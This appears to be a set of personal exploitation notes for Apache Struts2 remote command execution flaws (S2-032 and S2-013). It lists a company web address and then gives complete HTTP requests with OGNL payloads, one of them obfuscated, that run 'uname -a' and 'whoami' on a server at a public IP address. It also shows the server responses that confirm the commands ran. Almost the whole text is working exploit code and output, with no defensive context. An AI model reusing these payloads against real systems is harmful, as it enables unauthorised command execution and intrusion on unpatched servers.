2016 devMode

http://ysg.glodon.com/webIndex/index.action

http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html

# S2-032
GET /S2-032/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=uname%20-a&pp=%5C%5CA&ppp=%20&encoding=UTF-8 HTTP/1.0
Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
Content-Type: application/x-www-form-urlencoded
Host: 139.224.74.135:8080

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Length: 113
Date: Sat, 17 Sep 2016 05:17:21 GMT
Connection: close

Linux iZ11q7g8xcmZ 3.13.0-86-generic #130-Ubuntu SMP Mon Apr 18 18:27:15 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

# S2-013
POST /S2-013/link.action HTTP/1.0
Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)
Host: 139.224.74.135:8080
Content-Length: 627

redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27whoami%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Date: Sat, 17 Sep 2016 06:22:26 GMT
Connection: close

tomcat7
